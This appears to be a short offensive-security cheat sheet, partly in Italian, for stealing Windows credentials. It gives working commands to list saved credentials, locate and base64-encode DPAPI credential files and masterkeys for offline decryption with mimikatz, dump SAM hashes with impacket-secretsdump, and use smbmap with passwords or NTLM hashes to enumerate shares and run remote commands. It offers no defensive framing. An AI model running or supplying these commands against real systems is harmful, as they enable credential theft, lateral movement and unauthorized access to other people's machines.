## DPAPI Abuse (https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)
cmdkey /list  
runas /user:DOMAIN\USER /savecred  
cmd /c "dir /S /AS C:\Users\security\AppData\Local\Microsoft\Vault & dir /S /AS  
C:\Users\security\AppData\Local\Microsoft\Credentials & dir /S /AS  
C:\Users\security\AppData\Local\Microsoft\Protect & dir /S /AS  
C:\Users\security\AppData\Roaming\Microsoft\Vault & dir /S /AS  
C:\Users\security\AppData\Roaming\Microsoft\Credentials & dir /S /AS  
C:\Users\security\AppData\Roaming\Microsoft\Protect"

(FIND FILES and MASTERKEYS for DPAPI ABUSE)

[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\security\AppData\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290"))  
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580"))

Copiare e incollare in file in Linux, usare base64 -d sui file e salvare il contenuto per ricreare il file originale.  

Usare mimikatz in Windows per estrarre credenziali usando le info recuperate.

## SAM hive dump
_impacket-secretsdump -system SYSTEM -sam SAM LOCAL_

## SMB Enumeration
_smbmap -u \[USERNAME\] -p \[PASSWORD OR NTLM HASH\] -H \[HOST OR IP\]_  
_smbmap -u \[USERNAME\] -p \[PASSWORD OR NTLM HASH\] -H \[HOST OR IP\] -s \[SHARE\] -x \['COMMAND TO EXECUTE'\]_  
